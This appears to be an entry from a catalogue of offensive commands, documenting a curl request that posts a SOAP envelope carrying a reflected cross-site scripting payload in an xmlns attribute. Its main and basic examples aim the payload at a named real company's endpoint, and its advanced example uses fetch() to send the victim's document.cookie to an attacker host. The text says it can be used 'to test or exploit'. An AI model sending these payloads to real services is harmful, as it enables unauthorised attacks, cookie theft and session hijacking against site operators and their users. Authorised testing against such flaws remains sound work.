---
data: >-
  curl -X POST 'https://go.mapbox.com/index.php/soap/' -H 'Content-Type:
  text/xml' --data '<?xml version="1.0" encoding="UTF-8"?><soap:Envelope
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><test
  xmlns="javascript:alert(document.cookie)"></test></soap:Body></soap:Envelope>'
tags:
  - xss
  - soap
  - xml
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:18.618Z'
id: 98bd0a86-f45a-4028-a44a-a5f401a350cb
verified: false
validated: true
submitted: true
---
# curl-send-malicious-soap

## Command

```bash
curl -X POST 'https://go.mapbox.com/index.php/soap/' \
  -H 'Content-Type: text/xml' \
  --data '<?xml version="1.0" encoding="UTF-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><test xmlns="javascript:alert(document.cookie)"></test></soap:Body></soap:Envelope>'
```

## Description

This command sends a malicious SOAP XML payload to a vulnerable endpoint, injecting a reflected XSS via the xmlns attribute to execute JavaScript in the response context. Use it to test or exploit unsanitized XML namespace handling in web services.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| URL | Target SOAP endpoint (e.g., 'https://go.mapbox.com/index.php/soap/') | Yes |
| `-H 'Content-Type: text/xml'` | Sets XML content type header | Yes |
| `--data` | The malicious XML payload with javascript: URI in xmlns | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://go.mapbox.com/index.php/soap/' -H 'Content-Type: text/xml' --data '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test xmlns="javascript:alert(1)"></test></soap:Body></soap:Envelope>'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/soap/' -H 'Content-Type: text/xml' --data '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test xmlns="javascript:fetch(\'https://attacker.com/steal?cookie=\' + document.cookie)"></test></soap:Body></soap:Envelope>' -v
```

## Expected Output

A server response (HTTP 200 or similar) containing the reflected XML with the malicious xmlns. When loaded in a browser, it executes the JavaScript, e.g., an alert popup or network request to exfiltrate data. Verbose mode (-v) shows headers and full exchange.

## Related

- [[Related Procedure: Exploit Reflected XSS in SOAP XML Namespace]]
